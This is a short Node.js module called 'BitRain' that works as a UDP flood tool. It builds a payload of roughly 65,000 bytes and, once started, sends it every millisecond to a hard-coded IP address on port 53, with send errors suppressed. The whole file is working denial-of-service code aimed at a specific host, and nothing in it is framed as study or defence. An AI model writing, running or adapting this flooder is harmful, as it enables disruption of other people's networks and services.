const { time } = require("console");
const dgram = require("dgram");
const client = dgram.createSocket("udp4");

class BitRain {
  constructor() {
    this.timer;
    for (let i = 0; i < 65355; i++) {
      this.message += "X";
    }
  }
  send = (data) => {
    client.send(Buffer.from(this.message), data.port, data.ip, (err) => {
      //if (err) throw err;
    });
  };

  start = (data) => {
    this.timer = setInterval(() => {
      this.send({ ip: "172.67.220.239", port: 53 });
    }, 1);
  };
}

module.exports = new BitRain();
